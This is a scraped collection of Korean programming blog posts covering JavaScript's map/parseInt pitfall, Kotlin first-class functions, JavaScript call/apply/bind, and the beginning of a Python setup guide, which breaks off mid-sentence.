개발자 로드맵\n- 웹 개발 배우기에 늦은 게 아냐\n- 2024년 React 학습을 위한 10개의 무료 강좌\n- 웹 개발자 로드맵 (프론트엔드 + 백엔드)\n- 웹 개발자를 위한 5개의 HTML 및 CSS 무료 강좌\n- 프로그래머를 위한 Java 및 웹 개발 강좌 10개\n- 모든 소프트웨어 엔지니어가 배워야 할 10가지\n- 2024년에 Java 및 웹 개발자가 배울 수 있는 10가지 프레임워크\n\n이 글을 읽어 주셔서 감사해요. 만약 이러한 최고의 무료 프론트엔드 및 백엔드 개발 강좌를 좋아하신다면, 친구들과 동료들과 공유해 주세요. 궁금한 점이나 피드백이 있으면 남겨주세요.\n\n참고 - Node.js와 같이 가치 있는 것을 배우기 위해 약간의 돈을 지불해도 된다면, Udemy의 Andrew Mead나 Rob Percival과 같은 전문가들의 Node.js 강좌 목록도 확인해 보시기를 권유합니다.","ogImage":{"url":"/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_0.png"},"coverImage":"/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_0.png","tag":["Tech"],"readingTime":6},{"title":"자바스크립트에서 1, 5, 11mapparseInt가 1, NaN, 3을 반환하는 이유","description":"","date":"2024-05-15 10:28","slug":"2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript","content":"\n\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_0.png\" /\u003e\n\n다음에 그가 본 것은 그를 깊이 충격을 받게 했다:\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_1.png\" /\u003e\n\n이게 어떻게 가능할까? parseInt가 고장 났나? map()에 버그가 있나요?\n\n\n\n\n그는 절망적으로 올려다보았고, 제이크로부터 날카롭고 불안한 웃음소리를 듣게 되었다.\n\n코딩 실력 자랑꾼인 알렉스는 빠른 해킹과 짧은 코드를 자랑했다.\n\n산업에 아주 새로운 신입사원임에도 불구하고, 그는 항상 팀의 나머지보다 우월하다고 생각했으며, 자신이 원하는 대로 고집스럽게 행동했다. 그들의 선의로운 조언은 씌어지지 않았다.\n\n그러나 알렉스는 곧 충격적인 파멸과 마주하게 될 것이다. 그는 결코 잊지 못할 고통스럽고 겸손한 경험을 할 것이다.\n\n\n\n모든 것은 Alex와 Cody가 프로젝트 과제를 맡게 된 순간부터 시작되었습니다. 팀이 작업 중이던 전자상거래 웹 사이트의 제품을 사용자들이 볼 수 있도록 하기로 했죠.\n\n아직 스타트업 단계였기 때문에 모든 데이터는 CSV 파일에 저장되고 업데이트되었어요.\n\n제품 이름, 가격, 수량... 아마존과 같은 사이트에서 볼 수 있는 모든 일반적인 정보였죠.\n\nAlex는 협업 계획을 알게 되자 거만하게 비웃었습니다.\n\n\n\n\"누구하고 일을 한다는 건 전혀 필요하지 않아, 알았지?\" 그가 자신의 PC에서 타이핑을 하면서 웃었다. 엔지니어링 부서장인 온순한 제이크를 쳐다보았다. \"DB에서 가져와 JSX에 표시하는 거 뿐이야.\"\n\n\"알렉스, 타인과 협력하는 법 배워야 해. 계속 말하는데, 맞지?\", 제이크는 인내를 가지고 웃으며 대답했다. 그는 이 자의 자기 중심적인 짓궂음에 익숙했다.\n\n\"누구와 협력할 필요도 없어, 나 혼자서도 할 수 있어. 코디가 그 모호한 '가독성 좋은 코드' 얘기로 나를 방해할 뿐이야.\"\n\n\"코디는 최고 중 하나고, 시간을 들이는 게 그만한 이유가 있어. 코드를 빠르게 작성하고 간결하게 하는 게 전부가 아니라고 말했던 걸 계속 말하는데…\"\n\n\n\n\"너는 항상 내게 말을 하지만, 전혀 내 말을 듣지 않아. 이번에는 제게 혼자서 작업하게 해주세요, 알았죠?\"라며, 알렉스가 덧붙였어요. 너무 무례하게 들리지 않게 하려고 빠르게 말했죠 — 물론 그 스노비한 미소는 계속 유지하고 있었어요.\n\n제이크가 한숨을 쉬었어요.\n\n\"알았어요, 너 혼자서 작업할 수 있다면 이 문자열 배열을 숫자 배열로 변환해봐\", 그가 가까이 있는 종이에 노트하기 전에 말했어요.\n\n알렉스는 믿을 수가 없었어요. 종이에는 간단한 배열이 적혀 있었답니다.\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_2.png\" /\u003e\n\n이건 반드시 속임수 문제였다. 그는 의심스럽게 제이크를 쳐다봤다.\n\n\"진지하니? 이걸 파싱할 수 없을 정도로 얼마나 어리석다고 생각해?\"\n\n\"해보세요, 한 번의 기회밖에 없어요.\" 제이크는 이 소년에 대한 놀라운 인내심에 자기 제어력 메달을 받을 자격이 있다.\n\n\n\n심쿵 낀 표정을 지은 알렉스는 새로운 VS Code 터미널을 열고 오만한 표정으로 Node에서 보이는 당연한 솔루션을 타이핑했습니다:\n\n![image](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_3.png)\n\n자신만만한 듯 웃음을 지었지만, 자크가 알렉스에게 짓는 알아차릴 수밖에 없는 미소를 보자 순식간에 균형을 잃어버렸습니다.\n\n\"확실하단말씀이신가요, 알렉스? 엔터 키를 눌러 최종 배열이 어떻게 되는지 한번 보죠.\"\n\n\n\n본인에게 약간 의심스러운 마음이 들어, 최종 순간이 오기 전에 제공된 짧은 CLI 코드를 확실하게 확인하기로 했습니다.\n\n다음에 보여진 것은 그를 깊이 깨우치게 했습니다.\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_4.png\" /\u003e\n\n어떻게 이런 일이 가능한 걸까요? parseInt가 제대로 작동하지 않는 걸까요? 또는 map()에 버그가 있는 걸까요?\n\n\n\n허나, 처자는 상담을 시작했다.\n\n\n\n알렉스의 실패는 map과 parseInt를 이해하지 못해 일어난 것이 아니었습니다 - 그러나 그것이 도움이 될 수도 있었습니다.\n\n알렉스의 문제는 가독성과 명확성을 희생하면서 코드를 가능한 짧게 만드는 집착이었어요...\n\n사실 99%의 경우에는 우리가 map과 parseInt를 사용하는 방식이 이런 식입니다\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_5.png\" /\u003e\n\n\n\n하지만 console.log를 사용하여 맵을 사용할 때 무슨 일이 벌어지는지 알면 놀랄 지도 모릅니다:\n\n![이미지](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_6.png)\n\n각 항목에 대해 숫자 쌍이 3개씩 로깅됩니다!\n\n![이미지](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_7.png)\n\n\n\n그 이유는 map() 콜백이 실제로 3개의 인수를 가져오기 때문입니다:\n\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_8.png\" /\u003e\n\n\n따라서 실제로 3개의 인수로 parseInt를 호출하게 됩니다:\n\n\n\u003cimg src=\"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_9.png\" /\u003e\n  \n\n\n\n알렉스는 절대 parseInt가 1 또는 2개의 인수를 가져야 하며 각각에 대해 다르게 동작한다는 것을 몰랐습니다:\n\n두 번째 인수가 있는 경우 첫 번째 숫자 인수의 기수로 설정됩니다:\n\n![image](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_10.png)\n\n맵(map) 및 parseInt에 대한 평균 지식을 갖고 있지만, 명시적으로 표현하는 것으로 이 모든 것을 피할 수 있었을 텐데요:\n\n\n\n![image](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_11.png)\n\n코드를 줄이는 것은 혼란을 줄일 수 있는 좋은 방법이지만 항상 명확하고 가독성이 좋은 코드를 우선시해야 합니다.\n\n특히 길이가 그리 큰 문제가 아닌 경우에는 더욱 그렇죠?\n\n![image](/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_12.png)","ogImage":{"url":"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_0.png"},"coverImage":"/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_0.png","tag":["Tech"],"readingTime":4},{"title":"코틀린 함수가 일등 시민인 이유","description":"","date":"2024-05-15 10:25","slug":"2024-05-15-KotlinFunctionsasFirstClassCitizens","content":"\n\n코틀린에서 함수 구성 이해하기\n\n![코틀린 함수](/assets/img/2024-05-15-KotlinFunctionsasFirstClassCitizens_0.png)\n\n코틀린에서 함수는 일등 시민으로 취급되어 변수처럼 다룰 수 있습니다. 즉, 함수는 변수에 할당되거나 다른 함수에 매개변수로 전달되거나 함수에서 반환될 수 있습니다.\n\n이를 통해 함수를 다양한 방식으로 결합하여 코드를 간소화하고 함수형 프로그래밍 패러다임을 사용할 수 있습니다.\n\n\n\n자, 우리가 얻을 수 있는 몇 가지 기능들을 살펴봅시다!\n\n## 변수에 값 할당하기 📝\n\n이것에 대한 예시는 다음과 같습니다:\n\n```js\n// 선언\nval foo : () -\u003e Unit = {\n    println(\"안녕 함수!\")\n}\n\n// 사용\nfoo()\n\n// 결과\n안녕 함수!\n```\n\n\n\n참고: 네, 당신은 보통 또는 선언적으로 할 수 있습니다. 여기서는 함수 합성에 대해 이야기하고 있으므로 주석 섹션에서 소리치지 않아도 됩니다.\n\n이 방법의 장점:\n\n- 재사용성\n\n변수에 저장해 두었기 때문에 코드베이스의 여러 곳에서 재사용할 수 있습니다.\n\n\n\n```kotlin\n// 현재 시간 계산\nval currentTime: () -\u003e Unit = {\n    val currentTime = LocalTime.now()\n    val formatter = DateTimeFormatter.ofPattern(\"HH:mm:ss\")\n    val formattedTime = currentTime.format(formatter)\n    println(\"현재 시간은: $formattedTime\")\n}\n\n// 보통은 호출하여 사용\ncurrentTime()\n\n// 또는 일정 간격으로\n\nsuspend fun repeatInterval(block: () -\u003e Unit, delay: Long) {\n    while (true) {\n        delay(delay)\n        block.invoke()\n    }\n}\n\nfun main(){\n    runBlocking {\n        launch {\n            // 매개변수로 전달하는 사용법\n            repeatInterval(currentTime, 1000)\n        }\n    }\n}\n```\n\n2. 가독성\n\n익명 함수 대신 변수 이름을 전달하여 더 명확하게 만들 수 있습니다. 그렇지 않으면 전체 함수 블록을 읽어야 이해할 수 있습니다. 예시 :\n\n```kotlin\nrepeatInterval({\n  val currentTime = LocalTime.now()\n  val formatter = DateTimeFormatter.ofPattern(\"HH:mm:ss\")\n  val formattedTime = currentTime.format(formatter)\n  println(\"현재 시간은: $formattedTime\")\n  // 이것을 이해하려면 전체를 읽어야 합니다\n }, 1000)\n\n// 대비\n\nval currentTime: () -\u003e Unit = {\n    val currentTime = LocalTime.now()\n    val formatter = DateTimeFormatter.ofPattern(\"HH:mm:ss\")\n    val formattedTime = currentTime.format(formatter)\n    println(\"현재 시간은: $formattedTime\")\n}\n\nrepeatInterval(currentTime, 1000)\n```\n\n\n\n## 함수를 인수로 전달할 수 있어요 🔀\n\n가장 흔한 사용 사례는 악명 높은 콜백 함수입니다. 예를 들어,\n\n```js\n// count complete callback\nval countCompleteCallback : () -\u003e Unit = {\n    println(\"카운팅이 완료되었습니다!\")\n}\n\n// 콜백을 인수로 전달\nfun count10(callback:() -\u003e Unit){\n    (1..10).toList().joinToString().also(::println)\n    callback.invoke()\n}\n\n// 트리거\ncount10(countCompleteCallback)\n\n// 결과\n1, 2, 3, 4, 5, 6, 7, 8, 9, 10\n카운팅이 완료되었습니다!\n```\n\n하지만 우리가 가장 흔히 하는 일은 무엇인지 되돌아보자\n\n\n\n```js\n(1..10).map { it -\u003e it * it }.also(::println)\n```\n\n여기서 map 함수는 구문 설탕을 추가하고 있지만 실제 코드는 다음과 같습니다.\n\n```js\n(1..10).map ({ it -\u003e it * it }).also(::println)\n\n// 또는 \n\nval double = { it -\u003e it * it }\n(1..10).map(double).also(::println)\n```\n\n맵 작업에서는 함수를 매개변수로 전달하고 있습니다. 이 방식은 모듈화되어 있고 집중적이어서 좋은 접근 방식입니다.\n\n\n\n## 다른 함수에서 함수를 반환할 수 있어요 🔙\n\n이것은 많은 사람들에게 이해하기 어려운 내용이지만, 이것을 기반으로 한 가장 유용한 팩토리 함수가 있어요. 예시를 보겠습니다:\n\n```js\nenum class Language {\n    ENGLISH,\n    FRENCH,\n    HINDI\n}\n\nfun greet(language: Language, name: String) {\n    val greetings = when (language) {\n        Language.ENGLISH -\u003e \"Hello, $name!\"\n        Language.FRENCH -\u003e \"Bonjour, $name!\"\n        Language.HINDI -\u003e \"नमस्ते, $name!\"\n    }\n    println(greetings)\n}\n\ngreet(Language.HINDI, \"Chetan\") // नमस्ते, Chetan!\ngreet(Language.ENGLISH, \"Chetan\") // Hello, Chetan!\ngreet(Language.FRENCH, \"Chetan\") // Bonjour, Chetan!\n```\n\n이 프로그램은 언어와 이름을 인수로 사용하여 인사말을 출력합니다. 또는 이렇게도 할 수 있어요:\n\n\n\n```js\nenum class Language {\n    ENGLISH,\n    FRENCH,\n    HINDI\n}\n\nfun greetFactory(language: Language): (String) -\u003e Unit {\n    // function within function\n    val greetTo = { name: String -\u003e\n        val greetings = when(language){\n            Language.ENGLISH -\u003e \"Hello, $name!\"\n            Language.FRENCH -\u003e \"Bonjour, $name!\"\n            Language.HINDI -\u003e \"नमस्ते, $name!\"\n        }\n        println(greetings)\n    }\n\n    // returning function\n    return greetTo\n}\n\n// mini function factories which are reusable\nval englishGreeting = greetFactory(Language.ENGLISH)\nval frenchGreeting = greetFactory(Language.FRENCH)\nval hindiGreeting = greetFactory(Language.HINDI)\n\n// use them separately \nhindiGreeting(\"Chetan\") // नमस्ते, Chetan!\nenglishGreeting(\"Chetan\") // Hello, Chetan!\nfrenchGreeting(\"Chetan\") // Bonjour, Chetan!\n```\n\n추후에 좋아하는 경우에 우리가 다양한 함수 조합 방법을 알고 있다는 것을 걱정하지 마십시오.\n\n## 커링 함수: 부분 실행 🥘\n\n커링 함수 또는 부분 실행 함수는 함수를 반환하는 함수의 부작용입니다. 이를 사용하여 함수의 일부분만 실행할 수 있지만 모두 실행하는 것은 아닙니다. 한 예를 살펴보겠습니다 :```\n\n\n\n```kotlin\n// 두 숫자를 더하는 커링된 함수를 정의했습니다\nfun curriedAdd(firstNumber: Int): (Int) -\u003e Int {\n    val sumWith = { secondNumber: Int -\u003e\n        val sum = firstNumber + secondNumber\n        sum\n    }\n    return sumWith\n}\n\n// 커링을 사용하여 부분적으로 적용된 함수를 생성합니다\nval partialResult = curriedAdd(2) // 이 함수는 첫 번째 인수를 2로 고정합니다\n\n// 이제 addTwo는 인수에 2를 더하는 함수입니다\nval result1 = partialResult(3) \nval result2 = partialResult(10) \n\nprintln(\"Result1: $result1\") // 결과: 2 + 3 = 5\nprintln(\"Result2: $result2\") // 결과: 2 + 10 = 12\n```\n\n여기서 `curriedAdd` 함수는 값 2로 부분 실행되며, 3이 전달될 때 완전 실행되어 결과를 반환합니다. 계산된 값들을 매개변수로 사용하는 경우 뒤에 계산을 완료한 값을로드할 수 있어 매우 편리합니다.\n\n## 클로저 👯\n\n클로저는 외부 함수 범위에 있는 변수에 접근할 수 있도록 내부 함수를 통해 제공합니다. 아래 예제를 참조하세요:\n\n\n\n\n```js\nfun countWithClosure(): () -\u003e Unit {\n    var counter = 0 // 외부 스코프에서 정의된 변수\n    val innerFunction = {\n        counter++ // 외부 스코프의 변수에 접근 및 수정\n        println(\"Counter: $counter\")\n    }\n    return innerFunction\n}\n\nval increment = countWithClosure()\n\nincrement() // 출력: Counter: 1\nincrement() // 출력: Counter: 2\nincrement() // 출력: Counter: 3\n```\n\n기본적으로 두 개의 함수인 외부 함수와 내부 함수가 역할에 관여하며, 내부 함수는 외부 함수 스코프에 접근할 수 있으며 내부 함수 스코프를 사용하여 외부 스코프의 값을 변경할 수 있습니다.\n\nReact에서 매우 인기 있는 기능으로 사용자 정의 후크를 만드는 데 사용되며, Kotlin에서 Jetpack Compose에서도 사용할 수 있습니다.\n\n```js\nval leakyClosure: () -\u003e Unit = {\n    // 여기서 컨텍스트나 다른 Composable에 액세스하면 메모리 누수가 발생할 수 있습니다.\n}\n```\n\n\n\n## 함수는 데이터 구조에 저장될 수 있어요 💾\n\n함수를 컬렉션/데이터 구조에 저장할 수 있어요:\n\n```js\nfun greet() {println(\"hello world!\")}\nfun farewell() {println(\"bye bye world!\")}\n\nval functions : List\u003c()-\u003eUnit\u003e = listOf(::greet, ::farewell)\n\n// 리스트를 반복하며 각 함수를 호출해요\nfunctions.onEach { it.invoke() }\n\n// 결과\nhello world!\nbye bye world!\n```\n\n런타임에서 코드 동작을 조작할 수 있어요. 저는 지난 회사에서 실시간 매개 변수 값을 가져와 서버에 기록하기 위해 분석을 구축하는 데 사용했어요. 예를 들어:\n\n\n\n```kotlin\nfun logOnUserClicked () : Map\u003cString,Any\u003e { \n  ...\n  return mapOf(\n    \"이메일\" to datastore.userEmail,\n    \"안드로이드 버전\" to BuildConfig.Version\n  )\n}\n\nfun logOnBackPress () : Map\u003cString,Any\u003e { ...}\n\nval events : List\u003c()-\u003eUnit\u003e = listOf(::logOnUserClicked, ::logOnBackPress)\n\nevents.forEach { event -\u003e\n  loggingSdk.log(event())\n}\n```\n\n만약 지금 분석 시스템을 설계하는 방법에 대한 자세한 가이드가 필요하다면, 기사에 댓글을 달아주세요. 다음에 그에 맞는 내용을 만들어 보겠습니다.\n\n함수를 객체에 저장할 수도 있습니다. 예를들어:\n\n```kotlin\ndata class Calculator(\n    val addition: (Int, Int) -\u003e Int = { num1, num2 -\u003e num1 + num2 },\n    val subtraction: (Int, Int) -\u003e Int = { num1, num2 -\u003e num1 - num2 },\n    val multiplication: (Int, Int) -\u003e Int = { num1, num2 -\u003e num1 * num2 },\n)\n\nval calculator = Calculator()\n\nval result1 = calculator.addition(5, 3) // 결과: 8\nval result2 = calculator.subtraction(10, 4) // 결과: 6\nval result3 = calculator.multiplication(6, 2) // 결과: 12\n```\n\n\n\n객체 내에 함수를 저장하면 코드 구조를 더 잘 정의하고 강력하고 다재다능한 프로그래밍 기술을 구현할 수 있습니다.\n\n## 익명 함수 🕵🏽‍♂️\n\n일시적이거나 일회성 함수에 매우 유용합니다. 이름을 부여하지 않은 함수들이기 때문에 당연히 인라인 함수라고도 불립니다 — 그렇지 않았다면 왜 익명인지요?\n\n이미 알고 계신 예시:\n\n\n\n```js\n(1..10).map { it -\u003e it * it }.also(::println) // 결과: [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n(1..10).filter { it -\u003e it % 2 == 0 }.also(::println) // 결과: [2, 4, 6, 8, 10]\n```\n\n여기까지입니다. 읽어주셔서 감사합니다!\n\n## - 삶 속에서의 업데이트 -\n\n안녕하세요 👋! 저는 코틀린과 안드로이드 개발에서 7년 이상의 실무 경험을 보유하고 있습니다. 새로운 흥미로운 기회를 찾고 있습니다! 제 포트폴리오와 GitHub 기여를 살펴보시고, 회사에서 경험 많은 안드로이드 개발자가 필요하다면 chetan.garg36@gmail.com으로 연락해주세요. 또한 WhatsApp 번호 +91 8368928213로 연락하거나 LinkedIn에서 저와 연결할 수도 있습니다. 제 전문성을 귀하의 팀에 어떻게 가져다줄 수 있는지 이야기해 보겠습니다!```","ogImage":{"url":"/assets/img/2024-05-15-KotlinFunctionsasFirstClassCitizens_0.png"},"coverImage":"/assets/img/2024-05-15-KotlinFunctionsasFirstClassCitizens_0.png","tag":["Tech"],"readingTime":8},{"title":"자바스크립트에서의 Call, Apply 및 Bind 함수들 - 깊게 들어가보기","description":"","date":"2024-05-15 10:12","slug":"2024-05-15-CallApplyandBindFunctionsinJavascriptDeepDive","content":"\n\n이 게시물에서는 JavaScript에서 호출, 적용 및 바인드 함수의 개념을 더 깊게 탐구하여 혼란을 해소하기 위해 노력할 것입니다. 우리는 이러한 함수를 포괄적인 예제를 통해 탐구하여 명확한 이해를 제공할 것입니다.\n\n# 차이점\n\n- call()은 지정된 this 값과 개별 인수로 함수를 호출합니다.\n- apply()은 배열로 제공된 인수와 함께 지정된 this 값으로 함수를 호출합니다. 이것은 전달된 인수를 제외하고는 call() 함수와 유사합니다.\n- bind()는 지정된 this 값과 초기 인수를 가진 새로운 함수를 반환하여 나중에 호출할 수 있도록 합니다.\n\nJavaScript의 세 가지 함수 각각에 대해 더 자세히 살펴보고 JavaScript의 미묘한 차이를 경험하여 더 나은 이해를 얻어봅시다.\n\n\n\n# 더 깊게 파보기\n\n실제 시나리오에서 두 명의 개인, person1과 person2를 고려해보겠습니다. 각각 JavaScript 객체로 표현되며 이름과 나이와 같은 속성을 갖습니다. introduce() 함수를 사용하면 call() 메서드를 사용하여 각 객체 컨텍스트로 함수를 호출하여 개인 속성을 기반으로 한 개인화된 소개를 할 수 있습니다.\n\n```js\n// person1 객체 정의\nconst person1 = {\n    name: '히만슈',\n    age: 25\n};\n\n// person2 객체 정의\nconst person2 = {\n    name: '알록',\n    age: 35\n};\n\n// 소개 함수\nfunction introduce(state, city) {\n    console.log(`안녕, 나는 ${this.name}이고, ${this.age}살이야. ${state}, ${city}에 사는 중이야`);\n}\n\n// person1 소개\nintroduce.call(person1, '서벵갈', '콜카타');\n\n// person2 소개\nintroduce.call(person2, '자르크핸드', '란치');\n```\n\n이 예제에서:\n\n\n\n- 서로 다른 이름과 나이를 가진 두 person 객체인 person1과 person2를 정의합니다.\n- this 컨텍스트의 속성을 사용하여 메시지를 출력하는 introduce() 함수가 있습니다.\n- call()을 사용하여 각 person 객체를 this 컨텍스트로 사용하여 introduce() 함수를 호출합니다. 이를 통해 각 person을 적절한 이름과 나이로 개별적으로 소개할 수 있습니다.\n\nperson1과 person2의 같은 시나리오를 살펴봅시다\n\n```js\n// Define person1 object\nconst person1 = {\n    name: 'Himanshu',\n    age: 25\n};\n\n// Define person2 object\nconst person2 = {\n    name: 'Alok',\n    age: 35\n};\n\n// Introduce function\nfunction introduce(state, city) {\n    console.log(`Hi, I'm ${this.name} and I'm ${this.age} years old. I live in ${state}, ${city}`);\n}\n\n// Introduce person1\nintroduce.apply(person1, ['West Bengal', 'Kolkata']);\n\n// Introduce person2\nintroduce.apply(person2, ['Jharkhand', 'Ranchi']);\n```\n\n이 예시에서:\n\n\n\n- 동일한 person1, person2 객체를 사용하여 함수를 소개합니다.\n- person1과 person2 객체 컨텍스트 및 상태와 도시를 포함하는 인수 배열을 전달하여 각 사람을 개별적으로 소개하기 위해 apply()를 사용합니다.\n\n참고: call과 apply에서 어떻게 인수가 전달되는지 살펴보세요. 이 두 가지 사이에 차이가 있습니다.\n\n```js\n// person1 객체 정의\nconst person1 = {\n    name: '히만수',\n    age: 25\n};\n\n// person2 객체 정의\nconst person2 = {\n    name: '알록',\n    age: 35\n};\n\n// 소개 함수\nfunction introduce(state, city) {\n    console.log(`안녕, 저는 ${this.name}이고 ${this.age}살 입니다. 저는 ${state}, ${city}에 살고 있어요.`);\n}\n\n// introduce 함수를 person1에 바인딩\nconst introducePerson1 = introduce.bind(person1, '서부 벵갈', '콜카타');\n\n// introduce 함수를 person2에 바인딩\nconst introducePerson2 = introduce.bind(person2, '자르크핸드', '란치');\n\n// person1 소개\nintroducePerson1();\n\n// person2 소개\nintroducePerson2();\n```\n\n이 예시에서:\n\n\n\n- 동일한 person1과 person2 객체를 사용하고 함수를 소개했습니다.\n- bind()를 사용하여 this를 각각 person1과 person2에 영구적으로 바인딩하고 state 및 city 인수를 미리 지정한 introducePerson1 및 introducePerson2 새 함수를 만듭니다.\n- 그런 다음 introducePerson1() 및 introducePerson2()를 호출하여 각 인물을 해당하는 state 및 city와 함께 소개하여 나중에 미리 지정된 컨텍스트와 인수로 이러한 소개를 나중에 호출할 수 있는 능력을 보여주었습니다.\n\n# bind()에 대해 더 알아보기\n\n더 깊이 이해하고 흥미를 느낄 수 있는 몇 가지 고급 예제로 bind()를 자세히 살펴보겠습니다.\n\n```js\nconst person = {\n  age: 42,\n  getDetails: function() {\n    return this.age;\n  }\n};\n\nconst unboundGetDetails = person.getDetails;\nconsole.log(unboundGetDetails()); // 함수는 window 객체인 전역 범위에서 호출됩니다.\n// 예상 출력: undefined\n```\n\n\n\n여기서 explicit context없이 unboundGetDetails()가 호출됩니다. 결과적으로 getDetails 함수 내에서 this는 기본적으로 전역 객체(window)를 참조합니다. 전역 객체에 age가 정의되어 있지 않기 때문에, this.age는 undefined로 평가되어 결과가 undefined로 표시됩니다.\n\n이를 해결하고 getDetails 함수 내에서 this가 person 객체를 참조하도록 하려면 bind() 메소드를 사용합니다:\n\n```js\nconst boundGetDetails = unboundGetDetails.bind(person);\nconsole.log(boundGetDetails());\n// 예상 출력: 42\n```\n\n# 팁:\n\n\n\n만약 person.getDetails()가 42를 반환하고 unboundGetDetails()가 정의되지 않았다는 이유에 대해 궁금해하고 있다면, 혼란을 해소해보겠습니다.\n\n제공된 코드 스니펫에서 person.getDetails()와 unboundGetDetails() 간의 출력 차이는 this 키워드가 처리되는 방식 때문입니다.\n\n1. person.getDetails():\n\n여기서 getDetails() 메소드는 person 객체에 직접 호출됩니다. 메소드가 점 표기법 (object.method())을 사용하여 호출될 때, 마침표 왼쪽의 객체가 메소드 내에서 컨텍스트(this)로 설정됩니다. 따라서 getDetails() 내부의 this.age는 person.age를 가리키며, 이 값은 42입니다.\n\n\n\n2. unboundGetDetails():\n\n이 경우 getDetails() 메서드는 어떤 컨텍스트 없이 unboundGetDetails 변수에 할당됩니다. 이와 같이 메서드가 변수에 할당되면 해당 메서드는 원래의 컨텍스트를 잃게 됩니다. 따라서 unboundGetDetails()가 호출될 때 getDetails() 내부의 this.age는 더 이상 person.age를 참조하지 않습니다. 대신에 전역 객체 (또는 엄격 모드에서는 정의되지 않음)로 기본 설정되어 age가 정의되지 않은 곳으로 인식됩니다. 따라서 출력은 undefined가 됩니다.\n\n읽어 주셔서 감사합니다! 본 게시물이 도움이 되었다면 다른 사람들과 함께 공유해 주세요. 더 유익한 콘텐츠를 기대해 주세요!","ogImage":{"url":"/assets/img/2024-05-15-CallApplyandBindFunctionsinJavascriptDeepDive_0.png"},"coverImage":"/assets/img/2024-05-15-CallApplyandBindFunctionsinJavascriptDeepDive_0.png","tag":["Tech"],"readingTime":5},{"title":"파이썬 초보자를 위한 안내 프로처럼 설정하기","description":"","date":"2024-05-15 10:10","slug":"2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro","content":"\n\n이것은 '파이썬 초보자를 위한 가이드' 시리즈의 첫 번째 기사로, 여러분의 파이썬 여행을 시작하는 데 도움이 될 것입니다.\n\n그래서 여러분은 열정 넘치게 코딩을 시작하려고 합니다, 하지만 어디서부터 시작해야 할 지 모르겠죠?\n\n![Python 설치](/assets/img/2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro_0.png)\n\n# 1. 파이썬 설치\n\n\n\n먼저, 프로그래밍 언어 자체인 Python을 다운로드하고 설치해야 합니다.\n\n이 작업이 필요한 이유는 무엇일까요? 여러분이 기기 설정을 변경하여 현재 기기를 스페인어로 작동하도록 설정했다고 상상해보세요. 대부분의 기기는 여러 언어 옵션을 미리 설치하여 손쉽게 변경할 수 있지만, 스와힐리어로 바꾸고 싶다면 어떻게 해야 할까요? 이 설정이 쉽게 사용 가능하지 않을 수도 있지만, 언어 팩을 다운로드하고 설치함으로써 여전히 기기를 스와힐리어로 실행할 수 있습니다. Python을 다운로드하는 것도 같은 방식으로 작동합니다. Python 코드를 이해하고 실행할 수 있도록 기기를 활성화합니다.\n\nmacOS 및 Linux 시스템에는 Python이 미리 설치되어 있을 수도 있지만, 가장 최신 버전이 아닐 수도 있습니다.\n\n# 2. 코드 편집기 또는 통합 개발 환경 설치\n\n\n\n다음으로는 코드 편집기 또는 통합 개발 환경(IDE)이 필요합니다. 이 소프트웨어는 코드를 작성하고 편집할 작업 공간을 제공합니다. 인기 있는 옵션으로는 Visual Studio Code (VS Code), PyCharm, Jupyter Notebook 등이 있습니다.\n\n이미 혼란스러우신가요? 저도 그랬어요. 파이썬이 이미 설치되어 있는데 또 다른 도구가 필요한 이유가 뭘까요? 익숙한 비유를 통해 이해하는 것은 쉽습니다. 스와힐리어 언어 팩이 장치에 새로운 언어를 해석할 수 있게 해 주는 것처럼, Word, 메모장, Google 문서와 같은 애플리케이션은 실제로 텍스트를 작성하고 편집할 수 있는 작업 공간 역할을 합니다. 텍스트를 작성하기 위한 다양한 텍스트 편집기가 있는 것처럼, 코드를 작성할 수 있는 여러 옵션이 있습니다.\n\n이를 한 발짝 더 나아가면, 메모장을 Word나 Google 문서의 가벼운 대응체로 생각해볼 수 있습니다. 모두 동일한 기본 기능을 제공하지만 Word나 Google 문서는 서식 설정, 맞춤법 검사, 협업 편집과 같은 추가 기능을 제공합니다. 마찬가지로, 코드 편집기는 IDE의 가벼운 대응체입니다. 둘 다 코드를 읽고, 쓰고, 실행할 수 있지만, IDE는 전체 소프트웨어 개발 수명주기를 위한 고급 기능과 포괄적인 도구 세트를 제공합니다. 그래서, 어떤 것을 선택해야 할까요?\n\n답은 대부분 중요하지 않습니다.\n\n\n\n마찬가지로 워드와 구글 문서로 동일한 텍스트 블록을 작성할 수 있는 것처럼, VS Code 또는 PyCharm으로도 동일한 코드 블록을 작성할 수 있습니다. 궁극적으로는 각 도구에 대한 익숙함과 능숙함이 생산성을 결정할 것입니다. 그러나 산업 표준을 선택하는 것에는 이점이 있습니다. 온라인이나 동료로부터 도움을 받기 쉽고, 고용주들도 선호할 수 있습니다. VS Code는 일반적으로 산업 내에서 인기가 많으며, 데이터 과학과 머신 러닝 분야에서 인기 있는 Jupyter Notebook도 있습니다.\n\n당신이 찾던 단호한 대답은 아니죠? 제가 동의합니다.\n\nJupyter Notebook부터 시작해보세요; 학습 곡선이 그리 가파르지 않습니다. Python에 빠르게 익숙해지는 것이 목표라면, 이 방법이 더 빠르게 달성할 수 있을 